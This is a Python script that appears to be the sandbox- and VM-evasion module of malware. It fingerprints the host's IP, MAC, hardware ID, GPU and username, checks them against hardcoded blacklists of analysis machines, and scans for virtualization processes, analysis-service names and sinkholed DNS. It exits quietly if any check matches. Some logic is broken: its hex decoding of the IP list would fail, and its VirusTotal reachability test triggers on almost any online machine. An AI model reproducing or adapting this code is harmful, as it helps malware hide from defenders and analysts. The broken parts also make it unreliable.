import os
import sys
import subprocess
import socket
import uuid
import re
import requests
import random
import time
import psutil

blacklisted_ips = ['10.200.169.204', '104.198.155.173', '104.200.151.35']
blacklisted_macs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58']
blacklisted_hwids = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009']
blacklisted_gpus = ['NVIDIA GeForce 840M', 'Microsoft Hyper-V Video']
blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', 'test']

def random_sleep():
    time.sleep(random.uniform(1, 5))

def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    gpu_info = subprocess.check_output("wmic path win32_videocontroller get caption").decode()
    gpu = [gpu.strip() for gpu in gpu_info.splitlines()[1:] if gpu.strip()][0] if gpu_info else "Unknown GPU"
    usern = os.getlogin()
    username = usern.lower()
    random_sleep()
    return ip_address, mac_address, hwid, gpu, username

def detect_environment():
    vm_indicators = ['VBOX', 'VIRTUALBOX', 'VMWARE', 'XEN', 'QEMU', 'VIRTUAL', 'HYPERVISOR', 'SBOX', 'SANDBOX']
    analysis_indicators = ['virustotal', 'hybrid-analysis', 'cuckoo', 'malwr', 'any.run', 'reverse.it', 'joe sandbox']
    output = subprocess.check_output('systeminfo').decode().upper()
    hostname = socket.gethostname().lower()
    username = os.getlogin().lower()

    suspicious_processes = [
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
        "vmacthlp", "sandboxiedcomlaunch", "sandboxierpcss"
    ]
    for process in psutil.process_iter(['name']):
        if process.info['name'] and process.info['name'].lower() in suspicious_processes:
            return True

    for indicator in vm_indicators + analysis_indicators:
        if indicator in output or indicator in hostname or indicator in username:
            return True

    if detect_sandbox_dns():
        return True

    try:
        if requests.get('https://www.virustotal.com/').status_code == 200:
            return True
    except:
        pass

    random_sleep()  
    return False

def detect_sandbox_dns():
    test_domains = ["google.com", "amazonaws.com"]
    for domain in test_domains:
        try:
            if socket.gethostbyname(domain) == '127.0.0.1':
                return True
        except socket.error:
            pass
    return False

def decode_string(encoded):
    return bytes.fromhex(encoded).decode('utf-8')

blacklisted_ips = [decode_string(ip_hex) for ip_hex in ['0A:C8:A9:CC', '68.0.97.0', '34.138.96.23']]

ip_address, mac_address, hwid, gpu, username = get_system_info()

if (detect_environment() or
    ip_address in blacklisted_ips or
    mac_address in blacklisted_macs or
    hwid in blacklisted_hwids or
    gpu in blacklisted_gpus or
    username in blacklistUsers):
    sys.exit()
